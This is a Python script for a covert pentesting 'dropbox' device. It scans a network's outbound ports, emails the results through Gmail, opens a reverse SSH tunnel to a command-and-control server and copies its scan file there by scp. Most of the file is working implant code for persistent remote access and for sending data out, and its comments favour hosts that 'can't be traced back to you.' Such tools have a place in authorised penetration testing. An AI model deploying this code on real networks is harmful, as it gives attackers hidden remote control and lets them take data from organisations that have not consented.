import nmap
import smtplib
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from datetime import datetime 
import time
import os
import sys
import requests
from random import randint
import subprocess

##############################################################################
# Script for checking outbound connectivty and potentially establishing ssh 
# tunnel on c2 if available. For use on raspberry pi or pentesting dropbox. 
# Checks for outbound services, emails results via SMTP/TLS if possible and 
# will also establish reverse ssh tunnel to C2 server if port is open outbound
##############################################################################

def main():
    ####################################################################
    # main() needs to be cleaned up; do port checks once and save 
    # results. For now its a bunch of loops and some repeated
    # checks. 
    ####################################################################
    #
    # C2 will have to be replaced with valid public C2 IP address: 
    c2_ip = '10.10.10.10'
    # Host out on the internet that can't be traced back to you that
    # you know has the list of potentially interesting ports open. 
    # Using egadz for this example:
    test_host = 'egadz.metasploit.com'
    # List of potentially interesting outbound ports to check for: 
    port_list = [22,53,443,465,587,4444,8080]
    scan_time = getTimestamp()
    email_contents = 'The following tcp ports are open outbound for this network to ' + test_host + ': \n\n' 
    for port in port_list:
        port_status = PortChecker(test_host,port)
        email_contents += 'Port ' + str(port) + ' on host ' + test_host + ' is ' + port_status + '\n' 
    # If port 80 is open, connect to ip.42.pl and record public IP:
    if 'open' in PortChecker(test_host,80): 
        http_open = True
        public_ip = requests.get('http://ip.42.pl/raw').text
        email_contents += 'HTTP outbound is open and the public IP is ' + public_ip + '\n'
    else: 
        http_open = False
        email_contents += 'HTTP outbound was not open and public IP could not be retrieved'
    # If port 22 is open, connect back to C2 for an ssh tunnel:
    if 'open' in PortChecker(test_host,22): 
        ssh_open = True
        # Generate a random local port for the ssh reverse tunnel:
        local_port = randint(2000, 2999)
        # Obviously change to suit your device:
        key_location = '/keys/ssh/id_rsa'        
        email_contents += 'SSH is open outbound to test host, connecting to C2 from ' + public_ip + '\n'
        email_contents += 'SSH tunnel will use local port ' + str(local_port)
        sshTunnel(key_location,local_port,c2_ip)
    else:
        ssh_open = False
    # Start checking gmail connectivity with tcp 465
    email_port = 465
    email_server = 'smtp.gmail.com'
    filename = '/scans/' + scan_time + '.txt'
    scan_file = open(filename, 'w')
    scan_file.write(email_contents)
    # Check for ports open to gmail. If open send email, then also 
    # check for open SSH to SCP scna file. Otherwise write
    # results to file locally and terminate program.
    if 'open' in PortChecker(email_server,email_port):    
        sendnotificationmail(email_contents,email_port)
        scan_file.write('\nPort 465 was open, sending scan results to gmail  \n')
        if ssh_open == True:
            scan_file.write('\nSCPing the scan file to the C2 server \n')
            scan_file.close()
            scpScanfile(key_location,filename,c2_ip)
            sys.exit()
        else:
            scan_file.write('\nSSH is not available so this is the end of the file. \n')
            scan_file.close()
            sys.exit()
    # If port 465 isn't open, maybe 587 is:     
    else:
        email_port = 587
        if 'open' in PortChecker(email_server,email_port):
            sendnotificationmail(email_contents,email_port)
            scan_file.write('\nPort 587 was open, sending scan results to gmail \n')
            if ssh_open == True:
                scan_file.write('\nSCPing the scan file to the C2 server \n')
                scan_file.close()
                scpScanfile(key_location,filename,c2_ip)
                sys.exit()
            else:
                scan_file.write('\nSSH is not available so this is the end of the file. \n')
                scan_file.close()
                sys.exit()
        # If no email ports are open outbound write results to file and end:     
        else:
            scan_file.write('\nNo email ports to smtp.gmail.com open, couldn\'t send email \n')
            if ssh_open == True:
                scan_file.write('\nSCPing the scan file to the C2 server \n')
                scan_file.close()
                scpScanfile(key_location,filename,c2_ip)
                sys.exit()
            else:
                scan_file.write('\nSSH is not available so this is the end of the file. \n')
                scan_file.close()
                sys.exit()      
                
# Function for sending email results:        
def sendnotificationmail(email_contents,email_port):
    gmail_user = ''
    gmail_password = ''
    to_email = ''
    # create message object
    msg = MIMEMultipart()
    # fill in all the normal email parts
    msg['Subject'] = "The Kali PI Has Connected to a New Network"
    msg['From'] = gmail_user
    msg['To'] = to_email
    SERVER = "smtp.gmail.com:" + str(email_port)
    # resultsFile = file(scanResults)
    # attachment = MIMEText(resultsFile.read())
    # attachment.add_header('Content-Disposition', 'attachment', filename=scanResults)
    body = email_contents
    msg.attach(MIMEText(body))
    # attach human-readable scan results
    # msg.attach(attachment)
    server = smtplib.SMTP_SSL(SERVER)
    server.ehlo()
    server.login(gmail_user , gmail_password)
    server.sendmail(msg['From'], msg['To'], msg.as_string())
    server.quit()
    
# Function for getting the timestamp:
def getTimestamp():
    day = time.strftime("%Y%m%d_")
    clock = time.strftime("%I%M%S")
    timestamp = day+clock
    return timestamp    

# Function for running a full nmap portscan:
# Not being used at the moment but will be eventually
def PortScannerFull(ip,scantime):
    print 'Starting nmap outbound port scan scan....'
    ls_error = 'cannot'
    if ls_error in os.popen('ls /scans/'):
        os.popen('mkdir -p /scans/')    
    nm = nmap.PortScanner()
    scan_results = nm.scan(str(ip), arguments = '-p 22,53,80,443,465,587 -sS')# '-oN /scans/' + scantime + '-outboundscan.txt')
    print 'Scan complete!'
    return scan_results

# Create an SSH tunnel back to the C2 for remote control of the dropbox:
def sshTunnel(key_location,local_port,c2_ip):
    ssh_tunnel = 'ssh -i ' + key_location + ' -N -R ' + str(local_port) + ':localhost:22 root@' +  c2_ip
    subprocess.Popen(ssh_tunnel, shell=True)

# SCP scan file back to the C2 server:
def scpScanfile(key_location,filename,c2_ip):
    scp_file = 'scp -i ' + key_location + ' ' + filename + ' root@' +  c2_ip + ':/root/'
    subprocess.Popen(scp_file, shell=True)

# Function for checking individual ports with a syn scan: 
def PortChecker(ip,port):
    print 'Checking port...'
    nm = nmap.PortScanner()
    scan_results = nm.scan(str(ip), arguments = '-sS -p ' + str(port))
    # This iteration is necessary if a hostname is used as the scan target, 
    # since the nmap results will be for whatever IP it resolved to.
    for ip_addy in scan_results['scan']:
        scanned_ip = ip_addy
    # Returns 'open' or 'closed' depending on nmap results: 
    print 'Port check on ' + str(port) + ' complete!'
    if 'open' in scan_results['scan'][scanned_ip]['tcp'][port]['state']:
        port_status = 'open'
        return port_status
    else:
        port_status = 'closed'
        return port_status
    
    
    
if __name__ == "__main__":
    main()
